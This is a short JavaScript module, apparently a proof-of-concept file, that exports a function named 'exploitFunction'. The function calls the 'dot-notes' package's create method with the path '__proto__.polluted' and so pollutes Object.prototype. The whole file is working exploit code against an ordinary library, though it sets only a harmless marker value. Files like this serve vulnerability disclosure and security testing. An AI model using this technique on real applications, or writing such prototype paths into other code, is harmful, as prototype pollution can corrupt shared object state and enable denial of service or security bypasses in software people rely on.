function exploitFunction(obj) {
    const dots = require("dot-notes");
    dots.create(obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };